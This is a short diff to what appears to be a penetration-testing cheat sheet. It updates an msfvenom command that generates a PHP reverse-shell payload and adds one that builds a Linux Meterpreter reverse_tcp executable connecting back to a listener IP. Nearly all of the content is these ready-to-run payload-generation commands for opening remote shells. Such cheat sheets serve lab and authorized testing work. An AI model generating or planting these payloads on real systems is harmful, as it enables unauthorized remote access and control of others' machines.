@@ -5,5 +5,9 @@
 ### Examples
 ###### PHP Reverse Shell
 ```
-msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=4444 -f raw > reverse_shell.php
+msfvenom -p php/reverse_php LHOST=10.2.25.82 LPORT=4444 -f raw > reverse_shell.php
+```
+###### Linux Executable
+```
+`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.2.25.82 LPORT=XXXX -f elf > rev_shell.elf`
 ```
